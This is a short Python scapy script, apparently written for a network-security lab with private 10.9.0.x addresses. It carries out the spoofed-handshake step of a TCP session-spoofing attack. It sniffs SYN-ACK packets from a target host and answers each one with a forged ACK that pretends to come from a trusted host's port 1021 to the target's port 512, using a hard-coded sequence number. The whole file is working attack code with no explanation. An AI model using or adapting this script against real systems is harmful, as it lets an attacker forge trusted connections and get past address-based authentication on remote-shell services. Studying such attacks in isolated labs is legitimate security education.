#!usr/bin/python3
from scapy.all import *
import sys

X_IP_Address = "10.9.0.3"
X_Tml_PortNo = 512

Trusted_IP_Address = "10.9.0.4"
Trusted_PortNo = 1021

def spoof_pkt(pkt):
	sequence_no = 647862699 + 1
	previous_ip = pkt[IP]
	previous_tcp = pkt[TCP]

	tcp_length = previous_ip.len - previous_ip.ihl*4 - previous_tcp.dataofs*4
	print("{}:{} -> {}:{} Flags={} Len={}".format(previous_ip.src, previous_tcp.sport,
		previous_ip.dst, previous_tcp.dport, previous_tcp.flags, tcp_length))

	if previous_tcp.flags == "SA":
		print("Sending Spoofed ACK Packet ...")
		IP_Layer = IP(src=Trusted_IP_Address, dst=X_IP_Address)
		TCP_Layer = TCP(sport=Trusted_PortNo,dport=X_Tml_PortNo,flags="A",
		 seq=sequence_no, ack= previous_ip.seq + 1)
		pkt = IP_Layer/TCP_Layer
		send(pkt,verbose=0)

pkt = sniff(filter="tcp and src host 10.9.0.3", prn=spoof_pkt)
